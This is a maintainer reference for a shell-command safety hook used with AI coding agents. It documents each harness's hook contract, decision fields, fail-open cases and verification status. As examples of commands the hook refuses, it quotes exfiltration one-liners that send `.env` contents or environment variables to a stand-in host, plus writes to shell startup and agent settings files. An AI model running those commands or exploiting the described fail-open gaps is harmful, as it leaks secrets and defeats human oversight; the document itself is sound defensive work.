# Harness behaviors

A maintainer reference for how each agent harness drives its pre-execution
("PreToolUse") hook: what envelope it sends us, what decision contract it
expects back, what reaches the model, and the per-target quirks that make wiring
easy to get silently wrong. The authoritative wiring lives in `src/targets/*.rs`;
this file is the consolidated picture so we don't have to re-derive it from
scattered comments each time.

When a fact here disagrees with a harness's current docs, the harness wins —
update both the relevant `targets/*.rs` and this file.

## Verification scorecard (single source of truth)

The one place the per-harness status is collected — update it whenever a target is tested or its
support changes, so the status is never re-derived from the scattered sections below. "Verified live"
= driven end-to-end against the running harness; "probe-verified" = confirmed by sending crafted
envelopes to the harness's hook runner; "assumed" = declares a known-shape mirror but not
independently exercised.

| Harness  | Runtime hook | Status | Evidence / note |
|----------|:------------:|--------|-----------------|
| **Claude** | ✅ | ✅ **Docs-checked** v2.1.302 (2026-10-21); live drive 2026-07 | `claude --version` is 2.1.302. `allow` skips the prompt. Omitting the decision is the normal flow. Explicit `defer` ends the turn. See §Claude. |
| **Codex** | ✅ | 📄 **Docs-checked** CLI 0.163.0 (2026-10-21); hooks not re-driven | `codex --version` is `codex-cli 0.163.0` (latest stable, 2026-10-15). `PreToolUse` `deny` is honored. A bare `allow` and `ask` fail open; `allow` with `updatedInput` rewrites. `PermissionRequest` `decision.behavior:"allow"` answers the approval. A sandboxed `/etc/hosts` read completed under `read-only` and `workspace-write`. See §Codex. |
| **Antigravity (`agy`)** | ✅ | 📄 **Docs-checked** v1.4.3 (2026-10-21); last live drive v1.1.2 | CLI `agy --version` is 1.4.3. Not re-driven. `allow` delegates to the next hook or default policy. `auto_approve` is the documented grant. `deny`, `ask`, `force_ask`, and `deny_unless_prior_grant` are documented. See §Gemini. |
| **Gemini** | (exit codes) | 📄 **Docs-checked** v0.64.0 (2026-10-21); binary not installed | Consumer accounts stopped 2026-06-18. Stable v0.64.0 (2026-10-13) still documents `BeforeTool` with `allow` / `deny` only. Target kept for that CLI. |
| **Qwen** | ✅ | 📄 **Docs-checked** v0.25.3 (2026-10-21); binary not installed | English hooks doc: shell tool id is `run_shell_command`. `allow` does not skip the approval prompt. `ask` and `additionalContext` are documented. Not driven live. See §Qwen. |
| **Droid** | ✅ | 📄 **Docs-checked** CLI v0.245.0 (2026-10-21); not installed, not driven live | `allow` can bypass the prompt; `deny` and `ask` are honored. Shell matcher is `Execute`. `additionalContext` is not listed on `PreToolUse`. See §Droid. |
| **Cursor** | ✅ | 📄 **Docs-checked** CLI v2026.10.08 (2026-10-21); last live drive `cursor-agent` v2026.07.16 | `cursor-agent --version` could not be run. The [CLI changelog](https://cursor.com/docs/cli/changelog) latest entry is v2026.10.08. Docs list `allow`, `deny`, and `ask` on `beforeShellExecution`. The v2026.07.16 drive found `deny` honored and `allow` ignored. No changelog entry through v2026.10.08 says `allow` is honored. See §Cursor. |
| **Copilot** | ✅ | 📄 **Docs-checked** v1.0.101 (2026-10-21); last live drive v1.0.71 | CLI not installed. `allow`, `deny`, and `ask` are documented. Autopilot denies `ask`; the cloud agent treats `ask` as `deny`. A command `preToolUse` hook fails closed on any non-zero exit; a timeout fails open. See §Copilot. |
| **Grok** | ✅ | ✅ **ASK for not-yet, DENY for boundaries** (v1.0.62, 2026-10-21) | A command safe-chains has not approved yet gets `hookSpecificOutput.permissionDecision:"ask"` (top-level `decision:"deny"`, exit 0) in `default`/`auto`/`plan`. A boundary, or any command in `bypassPermissions` or an unknown mode, gets top-level `decision:"deny"` and exit 2. `allow` declines to deny. See §Grok. |
| **opencode** | ❌ | 📄 **Docs-checked** v2.0.26 (2026-10-21); install still skipped | `opencode --version` is v2.0.26. v1 `permission.ask` does not fire ([#7006](https://github.com/anomalyco/opencode/issues/7006)). v2 documents `ctx.permission.hook("evaluate")`. safe-chains does not install a plugin. See §opencode. |

**Remaining live-verification work:** Qwen is docs-checked at v0.25.3 and was not driven live (see §Qwen). Grok asks about not-yet commands and denies boundaries (v1.0.62, 2026-10-21 — see §Grok); Copilot's
current contract is docs-checked at v1.0.101 (the v1.0.71 drive is the last live result — see §Copilot);
Cursor's schema is docs-checked at CLI v2026.10.08 (the v2026.07.16 drive is the last live result — see §Cursor);
Droid is docs-checked at CLI v0.245.0 and was not driven live (see §Droid); Gemini CLI v0.64.0 and `agy` 1.4.3 are docs-checked (the v1.1.2 drive is the last live result — see §Gemini); Claude is docs-checked at v2.1.302 (see §Claude); Codex is docs-checked at CLI 0.163.0 and was not re-driven (see §Codex); opencode v2.0.26 documents `permission.evaluate` and safe-chains still skips install (see §opencode).

## The model we rely on

safe-chains is **allowlist-only**; what it EMITS for a given command depends on the
**harness's capabilities** (`docs/design/harness-capability-model.md`):

- **Safe command** → `allow` where the harness grants (Claude; Codex `PermissionRequest`,
  which answers the approval Codex was about to show). Codex `PreToolUse` has no grant, so
  safe-chains stays silent and Codex's own flow runs the command.
- **Gated command** → *silent* where a human still reviews it (Claude's own prompt is the check),
  else **`deny`** where silence would run it and the harness has no `ask` (Codex `PreToolUse`:
  `workspace-write` runs an in-sandbox read with no approval). Exceptions on a deny-harness are
  config-level (a custom command / grant), not per-invocation.

So we *do* actively deny on some harnesses (Codex) — the flip from the old "never deny" is
deliberate and capability-driven; see the design doc + the per-target table below.

### What the hook cannot see, and why it needs re-checking

Every row in this document is about the **shell tool**. safe-chains is a hook on that one tool: it
receives the command string, classifies it, and answers. An agent's own file-editing tools — the
ones that read and write files directly, without a shell — never reach the hook at all.

That bounds every protection here. safe-chains refuses `echo x > ~/.config/safe-chains.toml` and
`echo x > ~/.claude/settings.json` in the shell, and it cannot see either file being rewritten by a
file-edit tool. The pins on those paths are defense against the shell surface, not a guarantee
about the file. Harness file permissions are what cover the rest, and there is no way for a
PreToolUse hook on the shell tool to substitute for them.

**This needs re-checking, not just recording.** The scorecard above dates every claim because
harnesses move, and the thing to watch for is not only a changed decision contract but a NEW TOOL
that runs commands by another route. A harness that grows a "run script" or "execute" tool
alongside its shell tool has grown a surface safe-chains does not cover until it is hooked too.
When re-verifying a harness, list its tools, not just its hook fields.

Two consequences that shape everything else:

- **A hook firing does not pause the world.** PreToolUse runs before the tool,
  but our abstain (or a non-decision context injection) does not block. The
  command proceeds through the normal approval path and, if approved, runs. By
  the time any model-visible note we emit is read, **the command has most likely
  already run.** Feedback we inject must therefore be guidance for *next time*,
  never an instruction to re-run. (See `cst/explain.rs::guidance`.)
- **Context injection must not carry a permission decision.** To surface a note
  to the model while leaving approval to the normal flow, the envelope must omit
  the decision field. Including one (even "ask") overrides the user's allowlist.

## Decision contract per target

The field name and accepted values differ per harness. Getting the field name
wrong fails *silently* — the harness ignores the unknown key and falls back to
its own permissions, so a mis-wired target looks like it "works" (commands still
run) while never actually auto-approving. The field is DECLARED per
target as `HookFormat::decision_pointer` (no default, so a new target must state it) and
`every_target_emits_its_decision_at_the_declared_field` holds every emission to it — including
that the decision does not ALSO appear at another harness's pointer, which is what a copy-pasted
target looks like.

| Target  | Tool / matcher          | Envelope shape                         | Decision field      | Values honored        | Timeout unit |
|---------|-------------------------|----------------------------------------|---------------------|-----------------------|--------------|
| Claude  | `Bash` (exact match)    | `{hookSpecificOutput: {...}}`          | `permissionDecision`| `allow` / `deny` / `ask` / `defer`. Omit is the normal flow, not `defer` | seconds (command default 600) |
| Codex `PreToolUse` | `Bash` (unified exec is reported as `Bash`); config nests under top-level `hooks` | `{hookSpecificOutput: {...}}` | `permissionDecision`| **deny** (gated); *silent* (safe). Bare `allow` and `ask` fail open (CLI 0.163.0). `allow` + `updatedInput` rewrites | seconds (default 600) |
| Codex `PermissionRequest` | `Bash`; same file, same command; routed on `hook_event_name` | `{hookSpecificOutput: {...}}` | `decision.behavior` | **allow** (safe); *silent* otherwise (Codex's own prompt). `deny` is honored; safe-chains does not emit it | seconds (default 600) |
| Qwen    | code matcher `^Bash$` (regex only); exact `Bash` is the alias; tool id `run_shell_command` | `{hookSpecificOutput: {...}}` | `permissionDecision` | `allow` (does not skip the prompt), **deny**, **ask** | seconds; a command value ≥ 1000 is still read as ms |
| Droid   | `Execute` (regex or exact; optional `commandRegex` on the shell string) | `{hookSpecificOutput: {...}}` | `permissionDecision` | **allow** (can bypass the prompt), **deny**, **ask** | seconds (default 60) |
| Gemini  | `^run_shell_command$` (`BeforeTool`) | `{decision: ...}` | `decision` | **allow** / **deny** (alias `block`). No `ask` | ms (examples use `5000`) |
| agy     | `run_command`           | `{decision, reason}`                   | `decision`          | `allow` (delegates), `auto_approve`, `deny`, `ask`, `force_ask`, `deny_unless_prior_grant` | seconds (default 30) |
| Cursor  | `beforeShellExecution` (matcher is the command string; safe-chains sets none) | flat object | `permission` | docs: `allow` / `deny` / `ask`. Live v2026.07.16: **deny** honored, `allow` ignored | seconds |
| Copilot | `bash` (self-filter; optional matcher is a full-string regex) | flat object; camelCase `toolArgs` is `unknown` | `permissionDecision` | **allow**, **deny**, **ask** (autopilot and the cloud agent deny `ask`) | `timeoutSec`, seconds (default 30) |
| Grok    | `Bash` (also matches `run_terminal_command`); config nests under `hooks` | camelCase `{toolInput: {command}, workspaceRoot, permissionMode}` | top-level `decision`, or `hookSpecificOutput.permissionDecision` when present | **ask** (not-yet, in `default`/`auto`/`plan`, exit 0); **deny** (boundary, or any other mode); `allow` declines to deny | seconds (default 5) |

Notes:
- **Droid**'s shell tool is `Execute`, not `Bash`. A `Bash` matcher never fires.
  See §Droid.
- **Gemini, agy, and Cursor** use `decision` / `permission`, not `permissionDecision`.
  agy's grant value is `auto_approve`. Gemini's hook `allow` is the other value beside `deny`.
- **Copilot** honors `allow`, `deny`, and `ask` on `preToolUse`
  ([hooks reference](https://docs.github.com/en/copilot/reference/hooks-reference)).
  Empty output is the default permission flow. safe-chains emits `allow` for a safe
  command and an empty body for a gated one. A command hook that exits non-zero
  fails closed, including when stdout says `allow`; a timeout fails open. A payload
  safe-chains cannot parse exits 0, so it does not trip that deny.

### Grok — docs-checked v1.0.62, 2026-10-21

`grok --version` could not be run on the 2026-10-21 docs pass. The installed build is 1.0.62 (changelog date
2026-10-16). Sources: `~/.grok/docs/user-guide/10-hooks.md`,
`22-permissions-and-safety.md`, and `14-headless-mode.md`. v1.0.62 was driven for the ask/deny split. The earlier live drive is v0.2.106.

- **Config.** Every `~/.grok/hooks/*.json` is loaded and those global files are
  trusted. safe-chains writes `~/.grok/hooks/safe-chains.json` as
  `{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"safe-chains hook grok","timeout":10}]}]}}`.
  A flat `PreToolUse` key is rejected. `matcher: "Bash"` matches `Bash` and
  `run_terminal_command`. `timeout` is seconds. The default is 5 (600 for `Stop`,
  `SubagentStop`, and `PostToolUse`). `0` keeps the default.
- **Input.** camelCase. `toolInput.command`, `toolName` (`run_terminal_command`),
  `cwd`, `workspaceRoot` (also `GROK_WORKSPACE_ROOT` and `CLAUDE_PROJECT_DIR`),
  `sessionId`, `permissionMode` (`default`, `auto`, `plan`, `bypassPermissions`),
  `hookEventName` (`pre_tool_use`), `hook_event_name` (`PreToolUse`), `timestamp`,
  plus `toolUseId` and `toolInputTruncated`. A snake_case envelope parses to
  nothing and fails open.
- **Decisions.** Top-level `decision` or `hookSpecificOutput.permissionDecision`.
  When both are present, `permissionDecision` wins. Values: `allow`, `deny`,
  `ask`, `defer` (legacy `approve` and `block` too). The message is
  `permissionDecisionReason` when set, otherwise `reason`. `allow` declines to
  deny and does not skip later permission checks. `ask` forces the permission
  prompt over always-approve, auto mode, a saved grant, and the safe-command
  list. A client that auto-answers every prompt still approves. `dontAsk` turns
  an `ask` into a denial. `ask` does not override a policy deny, an auto-mode
  block, or plan mode. `defer` is no opinion; `updatedInput` and
  `additionalContext` beside a `defer` are dropped. `additionalContext` reaches
  the model in a system reminder after the batch, unless the call is hook-denied
  or rejected at the prompt, and is clipped at 10,000 characters. Settings-file
  command and HTTP hooks can ask, defer, and send `additionalContext`. A
  grok-agent-sdk hook can only allow or deny.
- **Exit codes.** Exit 2 denies. Any other non-zero exit fails open unless stdout
  JSON contains `deny` or `continue: false`, which are honored at any exit code.
  A timeout, a crash, or malformed output fails open. An explicit deny, a reply
  past the read limit, or an unusable `updatedInput` blocks.
- **What safe-chains emits.** ASK for not-yet, DENY for boundaries.
  A safe command is `{"decision":"allow"}` exit 0. A hook `allow` declines to deny and is not a grant.
  A command safe-chains has not approved yet (no entry or grant applies, a built-in rule refused an option, a level stricter than the default, an unparseable command, a jj snapshot) in `default`, `auto`, or `plan` exits 0 with `{"decision":"deny","reason":R,"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":R}}`. R is the same text agy's `force_ask` carries. A grok that reads only the top-level field sees a deny.
  A boundary (credentials, raw devices, trust and login files, writes or execs under places that run later, other AI agents, safe-chains' own rule edits), and every gated command in `bypassPermissions`, a missing mode, or an unknown mode, is `{"decision":"deny","reason":R}` exit 2. The split is `explain_fix::gate`.
  safe-chains does not emit `defer`. A `defer` would let grok's built-in read-only list run `cat /etc/hosts` or `git diff --output=~/.zshrc` unasked. It does not emit `additionalContext`.
- **Ask, driven on v1.0.62.** In the TUI's normal mode (`default`) an ask prompts, names the hook, and shows the reason; reject cancels the turn. `bypassPermissions` (TUI always-approve, or headless `--always-approve`) is a deny and the command does not run. Headless `default` does not run an ask ("a headless run cannot ask for approval"). Headless `auto` does not run it: auto mode's classifier blocks it before a prompt. Headless `plan`, `dontAsk`, and `acceptEdits` send `default` and the ask does not run. An ask outranks an allow rule such as `Bash(zzgatetool:*)`. The envelopes and replies are in `tests/fixtures/grok/1.0.62/`, replayed by `tests/grok_fixtures.rs`. Plan mode was not driven in the TUI.
- **Live drive (v0.2.106, 2026-07).** `cat /etc/hosts` was blocked, the command
  did not run, and the reason reached the UI and the model. `ls -la` ran. That was before the ask; `cat /etc/hosts` is a not-yet command and prompts.
- **Compat.** `compat.claude.hooks` defaults to on, so Grok also loads
  `~/.claude/settings.json` hooks. The Claude parser cannot read Grok's camelCase
  envelope and fails open. Set `[compat.claude] hooks = false` to skip that load.

Verified: grok 1.0.62 2026-10-21

### Codex — docs-checked CLI 0.163.0, 2026-10-21

`codex --version` reports `codex-cli 0.163.0`, the latest stable release (2026-10-15).
A later alpha, 0.164.0-alpha.8, was not part of this check. Sources:
[Hooks](https://learn.chatgpt.com/docs/hooks),
[Sandbox](https://learn.chatgpt.com/docs/sandboxing),
[Agent approvals & security](https://learn.chatgpt.com/docs/agent-approvals-security),
and the hook schema plus the approval path at tag `rust-v0.163.0`. The 2026-07
probe and the 2026-10-05 source pass were not repeated as an agent session. No
hook was installed and no credentials were used.

- **Config.** `hooks.json`, or an inline `[hooks]` table, in `~/.codex/` and in a
  trusted project `.codex/`. Plugins can bundle the same file. Layers merge; a
  higher layer does not replace a lower one. The file allows an optional
  `description` and `hooks`. A flat top-level `PreToolUse` is rejected
  (`unknown field PreToolUse`) and the hook never loads. `--setup` writes both
  events under `hooks`, matcher `Bash`, command `safe-chains hook codex`.
  `matcher` is a regex. Empty, `*`, or omitted matches every tool for events
  that honor it. `Bash` matches the shell tool and unified exec
  (`exec_command`), which the payload reports as `Bash`. `apply_patch` also
  matches `Edit` and `Write`, and `tool_name` stays `apply_patch`. `timeout` is
  seconds. The default is 600 (`SessionEnd` and `Interrupt` default to 1 and
  cap at 3). `command` and `mcp_tool` handlers run. `prompt` and `agent`
  handlers are parsed and skipped. `features.hooks` is stable and on by
  default (`codex features list` on 0.163.0).
- **Trust.** Codex stores a hash of each non-managed hook and skips a new or
  changed hook until `/hooks` trusts it. Startup prints a warning when a hook
  needs review. Managed hooks are trusted by policy.
  `--dangerously-bypass-hook-trust` runs enabled hooks for that invocation
  without persisted trust. `--setup` cannot trust a hook. Project `.codex/`
  hooks load only when that layer is trusted.
- **Input.** `session_id`, `turn_id`, `cwd`, `hook_event_name`, `model`,
  `permission_mode` (`default`, `acceptEdits`, `plan`, `dontAsk`,
  `bypassPermissions`), and `transcript_path` (nullable). `PreToolUse` also
  sends `tool_name`, `tool_use_id`, and `tool_input`. `PermissionRequest` does
  not require `tool_use_id`. A subagent may add `agent_id` and `agent_type`.
  `cwd` is the session working directory. `exec_command`'s `workdir` is absent
  from `tool_input`; its `PreToolUse` payload is `{"command":"<cmd>"}`. A
  `Bash` `PermissionRequest` carries `command` and, when Codex has one,
  `description`. A network approval uses `network-access <host>`. The same
  events also carry `apply_patch` (its `tool_input.command` is the patch), MCP
  tools, `write_stdin`, and `request_permissions`, so `tool_name` must be
  `Bash` or safe-chains abstains. `write_stdin` does not run `PreToolUse`
  again. Hosted tools such as `WebSearch` are not hooked.
- **`PreToolUse` decisions.** `permissionDecision: "deny"` with
  `permissionDecisionReason` blocks. So does the legacy
  `{"decision":"block","reason":...}` shape, and exit 2 with the reason on
  stderr. `permissionDecision: "allow"` together with `updatedInput.command`
  rewrites the command. The last completed rewrite wins, and a block discards
  rewrites. A bare `allow`, with no `updatedInput`, is unsupported: the 0.163.0
  source marks the hook failed, reports
  `unsupported permissionDecision:allow`, and continues the call. On a
  synchronous command hook that failure also drops an accompanying
  `additionalContext`. `ask`, legacy `decision: "approve"`, `continue: false`,
  `stopReason`, and `suppressOutput` are parsed and fail open the same way.
  `additionalContext` with no decision is recorded and does not block. Plain
  stdout is ignored. A callback error, a timeout, or malformed JSON fails the
  hook and does not block. `updatedInput` without `allow` is an error.
- **`PermissionRequest` decisions.** The event was added in v0.122.0. It runs
  in the approval path, before the user or the guardian reviewer is asked, and
  only when Codex would ask: a sandbox escalation (`require_escalated`), a
  managed-network approval, or any other command that needs approval. It does
  not run for a command the sandbox already allows.
  `decision.behavior: "allow"` is `ReviewDecision::Approved` and skips the
  prompt. `behavior: "deny"` with `message` refuses. Empty stdout and exit 0
  decline to decide. Exit 2 with a reason on stderr denies; exit 2 with empty
  stderr fails the hook and takes no decision. Any other exit, or JSON Codex
  cannot parse, marks the hook failed and takes no decision. `updatedInput`,
  `updatedPermissions`, and `interrupt: true` fail closed. Several hooks: any
  `deny` wins, otherwise an `allow`. This event has no `additionalContext`
  field. `approval_policy = "untrusted"` is retired and can stop the client
  from starting. The stricter always-ask behavior is a user-level project
  entry `trust_level = "untrusted"` (`AskForApproval::UnlessTrusted`). An
  explicit `on-request` overrides that derived policy.
- **Approvals and the sandbox.** The sandbox is the boundary.
  `approval_policy` decides when Codex asks. The usual local preset is
  `workspace-write` with `on-request`: reads, in-workspace edits, and routine
  commands inside that boundary run with no approval. Network stays off unless
  `sandbox_workspace_write.network_access` is enabled. Permission profiles
  (`:read-only`, `:workspace`, `:danger-full-access`) do not compose with
  `sandbox_mode`: if that key is set in any loaded config, passed as
  `--sandbox`, or set by the selected profile, Codex uses the older sandbox
  settings. `read-only` can inspect files and asks before running a command.
  `approvals_reviewer = "auto_review"`
  reviews only actions that already need approval and does not widen the
  sandbox. A `PermissionRequest` allow of a `require_escalated` command runs
  with no filesystem sandbox, except when the filesystem policy has denied-read
  paths: those stay denied (`EscalatedSandboxWithRestrictions`, changelog
  0.161.0, #49353; `codex-rs/core/src/tools/sandboxing.rs` at `rust-v0.163.0`).
  On CLI 0.163.0, `codex sandbox -- <command>` runs that command under the
  platform sandbox. The docs' `codex sandbox macos` spelling is not a
  subcommand in this CLI: the first argument is the command. A read of
  `/etc/hosts` through that runner exited 0 under `sandbox_mode="read-only"`
  and under `sandbox_mode="workspace-write"`. That is the sandbox process, not
  an agent turn.
- **What safe-chains emits.** On `PreToolUse`, silence for a safe command and
  `permissionDecision: "deny"` for a gated one. It emits no `allow`, `ask`,
  `updatedInput`, or `additionalContext`. Silence is the safe-command answer:
  a bare `allow` fails open and Codex runs the command. safe-chains denies on
  `PreToolUse` because `workspace-write` runs an in-sandbox read with no prompt and `PreToolUse`
  has no `ask`. On `PermissionRequest`, `decision.behavior: "allow"` for a
  safe read and silence otherwise (`Defer`). It never emits `deny` on this
  event: a gated command was already denied at `PreToolUse`, and leaving the
  prompt is what this event is for. Both events go to `safe-chains hook codex`.
  `hook_event_name`, which Codex sets, selects the format.
- **The cwd is not the command's.** `exec_command`'s `workdir` is absent from
  both payloads, and an approval can leave the filesystem sandbox, so
  `PermissionRequest` sets `cwd_is_the_commands() == false`. Classification
  uses `UNKNOWN_WORKDIR` with the reported cwd as the workspace root. A
  relative write (`echo x >> .zshrc`) lands outside every workspace and stays
  on Codex's prompt. A path-free or absolute command classifies as usual.
  Writes are judged at the folder level (`[unknown_folder] writes`, or
  `hook codex --unknown-folder=LEVEL`; default `developer`). At `reads`, only
  `SafeRead` and below are granted, and every write goes to Codex's prompt. A
  `cwd` that folds to `/` (`/`, `/.`, `/Users/..`) or is not absolute abstains
  (`bounds_a_workspace`). `PreToolUse` keeps the reported cwd and its full
  band: there the sandbox confines writes. The `workdir` gap remains (TODO.md,
  "Codex runs a command in a `workdir`").
- **Network and shell syntax.** Same classifier as Claude Code (2026-10-08).
  An approval grants network the sandbox withheld. The classifier refuses a
  command that could carry a file or the environment out
  (`curl https://x/$(cat .env)`, `printenv | xargs -I{} curl https://x/{}`)
  and approves a network read (`curl https://example.com`, `git ls-remote`).
  A description that starts with `network-access ` is judged by its command.
  At `reads`, that is what Claude's hook would give with the folder equally
  unknown (`tests/codex_permission_request.rs`).
- **Older Codex.** Before v0.122.0 the events table did not reject unknown
  names, so an extra `PermissionRequest` key was ignored and `PreToolUse` kept
  working (v0.121.0 `hooks/src/engine/config.rs`). CLI 0.163.0 knows the
  event. The top-level file still rejects unknown keys. Unknown names inside
  `hooks` are ignored.
- **Shell children.** CLI 0.163.0 uses the standard shell executor. The patched
  zsh `execve` path is gone, and `[features].shell_zsh_fork` is ignored. A
  child of a shell command is not its own `PermissionRequest`. With both
  entries installed, a gated command the model runs is denied at `PreToolUse`,
  in tool dispatch, and never reaches this event. `PermissionRequest` still
  covers a user who keeps that entry and drops `PreToolUse`.
- **Not driven this pass.** No trusted hook and no agent turn. Live checks were
  `codex --version`, `codex features list`, and the sandboxed `/etc/hosts`
  reads above. The last agent drive is the 2026-07 probe on v0.144.3: a safe
  `cat README.md` ran, and a gated `cat /etc/hosts` was blocked by the hook.

Verified: codex 0.163.0 2026-10-21

### Gemini → Antigravity — docs-checked 2026-10-21

- **Gemini CLI.** The `gemini` binary is not installed. Stable v0.64.0 (2026-10-13) is the
  latest release on [geminicli.com](https://geminicli.com/docs/changelogs/latest/). Consumer
  Google AI Pro, Ultra, and free accounts stopped on 2026-06-18
  ([announcement](https://developers.googleblog.com/an-important-update-transitioning-gemini-cli-to-antigravity-cli/)).
  The [hooks reference](https://geminicli.com/docs/hooks/reference/) still documents
  `BeforeTool`. `decision` is `allow` or `deny` (`block` is an alias). A `deny` `reason` is
  sent to the agent. There is no hook `ask`. Exit 0 parses stdout JSON. Exit 2 blocks the
  tool and uses stderr as the reason. The shell tool is `run_shell_command`. Matchers are
  regular expressions. A configuration example sets `"timeout": 5000`, the same millisecond
  unit safe-chains writes (`60000`). `GEMINI_PROJECT_DIR` is set on the hook process.
  `additionalContext` is documented on `BeforeAgent`, not in the `BeforeTool` output fields.
  safe-chains emits `{decision, reason}` with `allow` for a safe command and an empty body
  otherwise. Not driven live on v0.64.0.

Verified: gemini 0.64.0 2026-10-21

#### Antigravity CLI (`agy`) — docs-checked v1.4.3, 2026-10-21

`agy --version` is 1.4.3. The live drive below is v1.1.2 and was not repeated. Current
contract, CLI tab: [Hooks](https://antigravity.google/docs/hooks).

- **Config.** Hook names are top-level keys in `.agents/hooks.json` (project) and
  `~/.gemini/config/hooks.json` (global). The CLI also reads hooks inside
  `~/.gemini/antigravity-cli/settings.json` and plugin `hooks.json`. `/hooks` lists them.
  `timeout` is seconds, default 30. Matcher `""` or `"*"` matches every tool; a name matches
  that tool; otherwise the field is a regular expression. safe-chains uses the name
  `safe-chains`, event `PreToolUse`, matcher `run_command`.
- **Shell tool.** `run_command` arguments are `CommandLine`, `Cwd`, `WaitMsBeforeAsync`,
  and optional `RunPersistent` and `RequestedTerminalID`. `manage_task` can send input to
  a background task. The payload's `toolCall.name` is `run_command`.
- **Input.** camelCase. Command at `toolCall.args.CommandLine`. `toolCall.args.Cwd` is the
  command's directory. `workspacePaths` lists workspace roots. Also `conversationId`,
  `stepIdx`, `modelName`, `transcriptPath`, `artifactDirectoryPath`.
- **Output.** `decision` is required. `allow` lets the call proceed and delegates to the
  next hook or the default policy. `auto_approve` approves when that policy would prompt,
  and still honors an explicit user rule. `deny` blocks. `ask` prompts and respects
  Always Allow. `force_ask` prompts and ignores cached permissions.
  `deny_unless_prior_grant` denies unless an earlier grant covered the resource. `reason`
  is the explanation. `overwrite` shallow-merges into `toolCall.args`. `permissionOverrides`
  is a list of resource strings.
- **What safe-chains emits.** `decision: "allow"` for a safe command and `force_ask` for a
  gated command. It does not emit `auto_approve`. It reads `workspacePaths[0]` as both cwd
  and root and does not read `toolCall.args.Cwd`.
- **Live drive (v1.1.2, 2026-07-13).** `deny` blocked `cat /etc/hosts` and showed the reason.
  `force_ask` prompted. `ask` respected the Always Allow cache. `allow`, with and without
  `permissionOverrides`, still prompted. A missing decision prompted rather than ran.

Verified: agy 1.4.3 2026-10-21

### Claude Code — docs-checked v2.1.302, 2026-10-21

`claude --version` is 2.1.302 (Claude Code). Current contract:
[Hooks](https://code.claude.com/docs/en/hooks). The 2026-07 session below was not repeated.

- **Config.** `PreToolUse` matcher `Bash` is an exact tool-name match. A value with any
  other character is an unanchored JavaScript regular expression. Command, HTTP, and
  MCP-tool hooks default to a 600 second timeout (30 seconds on `UserPromptSubmit`,
  `PreModelSwitch`, and `PostModelSwitch`). A `PreToolUse` timeout does not block the
  tool unless `onFailure` is `"block"`.
- **Decisions.** `hookSpecificOutput.permissionDecision`: `allow`, `deny`, `ask`, `defer`.
  `allow` skips the permission prompt, except for actions no mode auto-approves and
  reads from network paths, and it does not bypass a settings deny rule. `deny` blocks
  the call and the reason is shown to Claude. `ask` prompts, including in auto mode,
  where the classifier can still deny and cannot approve silently. `defer` ends the
  turn so the tool can be resumed, requires non-interactive `-p`, and drops
  `updatedInput` and `additionalContext`. Precedence across hooks is deny, then defer,
  then ask, then allow. Exit 0 with no JSON is no decision: the normal permission flow
  runs. Exit 2 blocks the call even when the JSON says `allow`. `additionalContext` is
  added beside the tool result and ignored when the decision is `defer`.
- **What safe-chains emits.** `permissionDecision: "allow"` for a safe command. For
  anything else, `additionalContext` and no decision, which is the normal flow. It does
  not emit `deny`, `ask`, or `defer`.
- **Live drive (2026-07).** An allow envelope auto-approved allowlisted commands with no
  prompt. A gated command returned `additionalContext` only, and the command went
  through Claude's own permission flow.

Verified: claude 2.1.302 2026-10-21

### Cursor CLI (`cursor-agent`) — docs-checked CLI v2026.10.08, 2026-10-21

`cursor-agent --version` could not be run. The published
[CLI changelog](https://cursor.com/docs/cli/changelog) latest entry is v2026.10.08.
Version directories beside the install are `2026.05.05-84a231c` and
`2026.07.16-899851b`; the wrapper runs `index.js` next to itself and does not name
which build that is. Current contract: [Hooks](https://cursor.com/docs/hooks).
The live drive below is `cursor-agent` v2026.07.16 and was not repeated.

- **Event safe-chains installs.** `~/.cursor/hooks.json` (`version: 1`) →
  `hooks.beforeShellExecution[]`, timeout 30 seconds, no matcher. A matcher on this
  event is tested against the shell command string. Input is top-level `command`,
  `cwd`, and `sandbox`, plus the common fields `conversation_id`, `generation_id`,
  `model`, `hook_event_name`, `cursor_version`, `workspace_roots`, `user_email`,
  and `transcript_path`. Output is `permission` (`allow`, `deny`, or `ask`),
  `user_message`, and `agent_message`. Any `deny` wins over `ask`, and `ask` wins
  over `allow`. Exit 0 uses the JSON. Invalid JSON or a schema mismatch on a
  permission hook blocks the action. Exit 2 is a deny. Any other non-zero exit
  fails open unless `failClosed` is true. A timeout is seconds and fails open
  the same way.
- **Second shell event.** `preToolUse` with `tool_name` `Shell` carries
  `tool_input.command` and `tool_input.working_directory`. Its output `permission`
  is `allow` or `deny`; `ask` is accepted by the schema and not enforced. safe-chains
  does not install that event. Its parser accepts `beforeShellExecution` only.
- **Live drive (v2026.07.16, 2026-07).** The hook fired. `cwd` arrived empty and
  the parser took `workspace_roots[0]` as the root. `permission: "deny"` blocked
  `echo` and showed `user_message`. `permission: "allow"` did not skip the
  command allowlist prompt ("Run this command? Not in allowlist: cat"), including
  from a wrapper that always returned allow. The [CLI changelog](https://cursor.com/docs/cli/changelog)
  through v2026.10.08 does not say that `allow` is now honored. The ignored-allow report is forum thread 144244.
- **What safe-chains emits.** `permission: "deny"` with `user_message` and
  `agent_message`, exit 0, for a gated command. `permission: "allow"` for a safe
  command. It does not emit `ask`. While the v2026.07.16 result holds, the deny
  is the protective lever and the allow is inert. A gated command is a hard block;
  the escape is a safe-chains grant, not Cursor's prompt.

Verified: cursor 2026.10.08 2026-10-21

### Droid (Factory) — docs-checked CLI v0.245.0, 2026-10-21

The `droid` CLI is not installed. CLI v0.245.0 (2026-10-20) is the latest entry on the
[release notes](https://docs.factory.com/changelog/release-notes). Current contract:
[hooks reference](https://docs.factory.com/reference/hooks-reference.md). Not driven live.

- **Config.** A standalone `~/.factory/hooks.json` or `.factory/hooks.json` is keyed
  by event name, with no outer `hooks` object. `settings.json` wraps the same map
  in `hooks`. Legacy `.factory/hooks/hooks.json` still loads. Commands need absolute
  paths. `timeout` is seconds, default 60. `matcher` is an exact tool name or a
  case-sensitive regex; empty, omitted, or `*` matches every tool. `commandRegex`
  is a second regex against the Execute command string. safe-chains writes the
  wrapped form in `~/.factory/settings.json`, matcher `Execute`, timeout 60.
  Common tool matchers include `Execute`, `Read`, `Edit`, `Create`, `ApplyPatch`,
  `LS`, `Glob`, `Grep`, `Task`, `FetchUrl`, and `WebSearch`. The changelog's Script
  runs are a separate command surface; `Execute` does not name them.
